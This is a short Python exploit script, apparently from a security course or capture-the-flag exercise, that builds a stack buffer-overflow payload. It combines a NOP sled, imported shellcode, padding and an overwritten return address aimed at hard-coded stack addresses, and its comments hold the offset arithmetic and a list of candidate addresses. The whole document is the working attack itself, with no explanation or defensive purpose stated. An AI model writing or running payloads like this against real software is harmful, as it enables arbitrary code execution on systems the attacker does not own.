#buffer a lot bigger than possible offset
#over jump instead of under jump
#fill rest of buffer with nops


from shellcode import shellcode
import sys

buffer_size = 1024 + 4 + 4
nop_sled = b'\x90' * (buffer_size-len(shellcode))
payload = nop_sled + shellcode
padding = b'FFFF'
payload += padding + (0xfff6c840).to_bytes(4, 'little')
#print(len(shellcode))
sys.stdout.buffer.write(payload)


# ebp - 0x408 = 0xfff6cbf8 - 0x408 = 0xfff6c7f0
"""
0xfff6c830
0xfff6c7f0
0xfff6c7d0
0xfff6c7a0
0x08048c39
0xfff6c840
0xfff6c760
"""
